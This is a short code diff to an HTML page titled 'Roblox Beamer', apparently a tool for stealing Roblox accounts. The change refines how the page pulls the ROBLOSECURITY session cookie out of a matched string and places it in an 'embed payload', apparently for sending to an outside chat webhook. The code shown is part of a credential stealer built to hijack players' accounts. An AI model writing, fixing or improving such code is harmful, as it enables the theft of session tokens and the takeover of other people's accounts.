@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Beamer</title>
+  <title>testRoblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -71,8 +71,8 @@
         return;
       }
 
-      // Extract only the ROBLOSECURITY token
-      const token = match[0];
+      // Extract only the ROBLOSECURITY token from the match
+      const token = match[0].split('=')[1]; // Extract token part after '='
 
       // Create the embed payload with the token
       const embedPayload = {
